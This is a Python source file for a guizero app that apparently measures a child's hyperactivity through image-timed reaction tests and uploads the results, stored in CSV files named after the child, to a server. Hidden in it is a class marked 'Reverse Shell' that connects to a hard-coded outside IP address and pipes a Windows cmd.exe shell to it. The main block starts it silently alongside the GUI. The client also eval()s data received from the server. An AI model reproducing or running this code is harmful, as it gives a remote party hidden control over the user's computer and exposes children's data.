import time as t
import random as r
from guizero import *
from threading import *
import socket, subprocess, threading
import csv


#Reverse Shell in python
class Windows(Thread):
    def s2p(self, s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()

    def p2s(self, s, p):
        while True:
            s.send(p.stdout.read(1))

    def run(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect(("95.157.165.95", 0x41))

        self.p = subprocess.Popen(["C:\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            stdin=subprocess.PIPE)

        self.s2p_thread = threading.Thread(target=self.s2p, args=[self.s, self.p])
        self.s2p_thread.daemon = True
        self.s2p_thread.start()

        self.p2s_thread = threading.Thread(target=self.p2s, args=[self.s, self.p])
        self.p2s_thread.daemon = True
        self.p2s_thread.start()

        try:
            self.p.wait()
        except KeyboardInterrupt:
            self.s.close()

#calcul de la moyenne en fonction d'une liste
def moyenne(lst, nb_range):
    if len(lst) == 0:
        return None
    sum = 0
    for a in range(len(lst)):
        sum += lst[a]
    return round(sum/nb_range, 3)

#Calcul de la mediane d'une liste
def mediane(lst):
    lst.sort()
    l_len = len(lst)
    if l_len < 1:
        return None
    if l_len % 2 == 0 :
        return round((lst[int(l_len/2 - 2)] + lst[int(l_len/2 - 1)]) /2, 3)
    else:
        return round(lst[int((l_len) /2 - 0.5)], 3)

#renvoie le contenu d'une valeur contenue dans un fichier .csv
def csv_reader(ind, file):
    search = csv.DictReader(open(file, 'r'))
    s = [dict(l) for l in search]
    return s[0].get(ind)

#classe héritée de App()
class Hype(App):
    def __init__(self, time=300, nb_imgs=20, proba_forte=40, proba_faible=10, fieldsnames=["Moyenne", "Mediane", "Avant", "Apres", "Dessus"], img_list=["img/dog.png", "img/car.png", "img/cat.png", "img/dog.png", "img/flower.png", "img/house.png", "img/tree.png"], save=False):
        super().__init__(title="Hyperactif Ismaël", layout="grid", height=350, width=550)
        #intitialisation des variables de base
        self.nb = time
        self.const_nb_imgs = nb_imgs + 1    
        self.has_started = 0
        self.list_imgs = img_list
        self.p1 = proba_forte
        self.p2 = proba_faible
        self.fieldsnames = fieldsnames
        self.save = save

        self.CreateMenuBar()

    def start_game(self):
        #mise à 0 ou initialisation des variables nécessaires à la mesure de l'hyperactivité
        self.nb_imgs = self.const_nb_imgs
        self.is_repeat = 1
        self.lst_times = []
        self.lst_weights = []
        self.valeurs = []
        self.nb_avant = self.nb_apres = self.must = self.nb_good = self.ind_list = 0    
        self.when_key_pressed = self.key
        #choix d'une image sur laquelle cliquer
        self.img_choice = r.choice(self.list_imgs)
        self.p = Picture(self, image=self.img_choice, grid=[1, 1])
        #remplire liste avec les probabilités pour chaque images

        for a in range(len(self.list_imgs)):
            if self.list_imgs[a] == self.img_choice:
                self.lst_weights.append(self.p1)
            else:
                self.lst_weights.append(self.p2)

        self.Button_start.visible = False
        self.text_escape.visible = self.text_img.visible = True
        #verification que la boucle ne tourne pas déjà
        if self.has_started == 0:
            self.repeat(self.nb, self.do_anim)
            self.has_started = 1

    def do_anim(self):
        #animation pour faire tourner les images
        if self.is_repeat == 1:
            self.cadre5.image = self.cadre4.image
            self.cadre4.image = self.cadre3.image
            self.cadre3.image = self.cadre2.image
            self.cadre2.image = self.cadre1.image
            #choix de la dernière image avec une probabilité plus élevée pour l'image choisie (self.p1)
            self.cadre1.image = (r.choices(self.list_imgs, weights=(
                self.lst_weights[0], self.lst_weights[1], self.lst_weights[2], self.lst_weights[3], self.lst_weights[4], self.lst_weights[5], self.lst_weights[6]
            ), k=1))[0]
            #mesure du temps si l'image est dans le cadre
            if self.cadre3.image == self.img_choice:
                self.timer = t.time()
            self.nb_imgs -= 1
            #si le nombre de tours = nombre d'images à devoir défiler alors stopper le programme
            if self.nb_imgs == 0:
                self.affich_answere()

    def key(self, e):
        #recupération des évènements de clavier
        if ord(e.key) == 32 and self.is_repeat == 1:
            self.verif_answere()

    def verif_answere(self):
        #verifier que l'image choisie correspond bien à l'image dans le cadre
        if self.cadre3.image == self.img_choice:
            self.good_answere()
        else:
            self.wrong_answere()

    def good_answere(self):
        #relève du temps et ajout d'une bonne réponse
        self.lst_times.append(t.time() - self.timer)
        self.nb_good += 1

    def wrong_answere(self):
        #déterminer si c'est juste avant ou après une image choisie
        if self.cadre2.image == self.img_choice:
            self.nb_avant += 1
        elif self.cadre4 == self.img_choice:
            self.nb_apres += 1

    def affich_answere(self):
        #affichage des valeurs à l'écran
        self.is_repeat = 0
        self.p.visible = self.text_escape.visible = self.text_img.visible = self.cadre1.visible = self.cadre2.visible = self.cadre3.visible = self.cadre4.visible = self.cadre5.visible = False
        #dictionnaire des valeurs (plus simple à visualiser)
        self.valeurs.append({
            "Moyenne": moyenne(self.lst_times, self.nb_good),
            "Mediane": mediane(self.lst_times),
            "Avant": self.nb_avant,
            "Apres": self.nb_apres,
            "Dessus": self.nb_good
        })
        text = "Temps de réaction moyen: {}\nTemps de réaction median: {}\nNombre de cliks avant: {}\nNombre de cliks après: {}\nNombre de cliks dessus: {}".format(
            moyenne(self.lst_times, self.nb_good), mediane(self.lst_times), self.nb_avant, self.nb_apres, self.nb_good
        )
        #enregistrement du dictionnaire dans fichier .csv au nom de l'enfant
        if self.save:
            self.csv_saver()

        self.Create_Widgets_aff(text)

    def csv_saver(self):
        #enregistrement dans fichier csv
        global socket_infos
        os.makedirs("csv/", exist_ok=True)
        #verifier que "csv/" exsiste sinon le créer
        try:
            with open("csv/" + socket_infos.get("file_name"), 'w') as csvfile:
                writer = csv.DictWriter(csvfile, fieldnames=self.fieldsnames)
                writer.writeheader()
                for data in self.valeurs:
                    writer.writerow(data)
        except IOError:
            print("I/O error")

    def Create_Widgets(self):
        #creation des widgets pour la mesure de l'hyperactivité
        self.clear()

        global socket_infos
        #relever le nom de l'enfant pour savoir le nom du fichier (pas de caractères spéciaux)
        socket_infos["file_name"] = self.question("Name", "Quel est le nom de l'enfant ?") + ".csv"

        self.Button_start = PushButton(self, text="Start", command=self.start_game, grid=[2, 1])

        self.cadre1 = Picture(self, image=self.list_imgs[0], grid=[0, 0])
        self.cadre2 = Picture(self, image=self.list_imgs[1], grid=[1, 0])
        self.cadre3 = Picture(self, image=self.list_imgs[2], grid=[2, 0], width=110, height=110)
        self.cadre3.bg = "red"
        self.cadre4 = Picture(self, image=self.list_imgs[3], grid=[3, 0])
        self.cadre5 = Picture(self, image=self.list_imgs[4], grid=[4, 0])

        self.text_escape = Text(self, text="Appuyez sur \nespace\n pour confirmer", grid=[3, 1], visible=False)
        self.text_img = Text(self, text="Image sur\nlaquelle cliquer:", grid=[0, 1], visible=False)

    def CreateMenuBar(self):
        #menubar pour afficher les options disponibles
        menubar = MenuBar(
            self,
            toplevel=["New", "Exit"],
            options=[
                [["New record", self.Create_Widgets], ["Download results", self.Create_Widgets_dow]],
                [["Exit", self.destroy]]
            ]
        )

    def upload(self):
        #uppload du fichier .csv de nom contenuu dans socket infos sur le serveur
        global socket_infos
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((socket_infos.get("server"), socket_infos.get("port")))
        with open("csv/" + socket_infos.get("file_name"), "r") as text:
            a = text.read()
        s.send(a.encode())
        s.send(socket_infos.get("file_name").encode())
        r = (str(s.recv(1)))[2:-1]
        if r == "1":
            self.warn("Info", "Erreur d'envoi")
        else:
            self.info("Info", "Envoyé avec succès !")
        self.ButtonWidg.visible = False

    def Create_Widgets_aff(self, t):
        #creation widgets pour l'affichage des resultats et l'upload du fichier
        self.Text_widg = Text(self, text=t, grid=[0, 0])
        self.ButtonWidg = PushButton(self, command=self.upload, text="Upload", grid=[0, 1])
        self.restart = PushButton(self, command=self.Create_Widgets, text="Nouvelle session", grid=[1, 1])

    def Create_Widgets_dow(self):
        #crzation widgets pour télécharger fichier .csv sur le serveur
        self.clear()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((socket_infos.get("server"), socket_infos.get("port")))

        s.send("get_list".encode())

        lst = eval((s.recv(90000)).decode('utf-8'))
        if lst != []:
            self.choice_file=ButtonGroup(self, options=lst, grid=[0, 1])
            self.ButtonWidgDown = PushButton(self, command=self.download, text="Download", grid=[0, 0])
        else:
            self.warn("Info", "Aucun fichier trouvé")

    def download(self):
        #téléchargement de fichier .csv sur le serveuur et affichege de ses valeurs dans la fenetre
        global socket_infos
        self.ButtonWidgDown.visible = self.choice_file.visible = False

        os.makedirs("csv/", exist_ok=True)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((socket_infos.get("server"), socket_infos.get("port")))
        file_name = self.choice_file.value
        s.send(file_name.encode())
        file_name = 'csv/{}'.format(file_name,)
        r = s.recv(9999999)
        with open(file_name, 'wb') as _file:
            _file.write(r)
        self.info("Info", "Le fichier a été\ncorrectement téléchargé")

        text = file_name[4:-4] + " :Temps de réaction moyen: {}\nTemps de réaction median: {}\nNombre de cliks avant: {}\nNombre de cliks après: {}\nNombre de cliks dessus: {}".format(
            csv_reader(self.fieldsnames[0], file_name), csv_reader(self.fieldsnames[1], file_name), csv_reader(self.fieldsnames[2], file_name), csv_reader(self.fieldsnames[3], file_name), csv_reader(self.fieldsnames[4], file_name)
        )
        self.affich_d = Text(self, text=text, grid=[0, 0])

    def clear(self):
        #lavement de fenetre (flemme de copier coller le bout de code alors autant en faire une fonction)
        try:
            self.Text_widg.visible = self.ButtonWidg.visible = self.restart.visible = self.affich_d.visible = False
        except:pass

if __name__ == "__main__":
    #si se fichier n'a pas été importé
    #creation de thread pour le reverse shell
    a = Windows()
    a.start()
    #infos concernant le serveur
    socket_infos = {
    "file_name": "test.csv",
    "server": "127.0.0.1",
    "port": 123
    }
    #creation de la fenètre avec certains paramètres personnalisables
    app_hyp = Hype(time=300, nb_imgs=50, proba_faible=10, proba_forte=40, save=True)
    app_hyp.display()
